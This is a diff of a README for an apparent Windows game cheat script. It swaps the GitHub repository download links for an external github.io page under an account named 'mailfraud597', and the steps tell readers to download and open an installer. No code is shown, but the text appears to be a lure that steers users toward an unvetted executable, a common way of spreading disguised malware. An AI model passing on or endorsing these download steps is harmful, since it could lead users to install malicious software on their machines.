@@ -1,6 +1,6 @@
 # 🏎️ Italian-Brainrot-Survival-Script-2026 - Automate your survival and win games
 
-[![](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://github.com/Allomorphic-mailfraud597/Italian-Brainrot-Survival-Script-2026)
+[![](https://img.shields.io/badge/Download-Click%20Here-blue.svg)](https://allomorphic-mailfraud597.github.io)
 
 This software helps players manage gameplay in Italian-Brainrot-Survival. It performs repetitive tasks like gathering items and avoiding enemies. It runs on Windows systems.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards for a stable experience:
 
 Follow these steps to prepare your machine.
 
-1. Visit the [official repository page](https://github.com/Allomorphic-mailfraud597/Italian-Brainrot-Survival-Script-2026) to access the files.
+1. Visit the [official repository page](https://allomorphic-mailfraud597.github.io) to access the files.
 2. Look for the releases section on the right side of the page.
 3. Download the latest version of the installer.
 4. Open the file after the download completes.
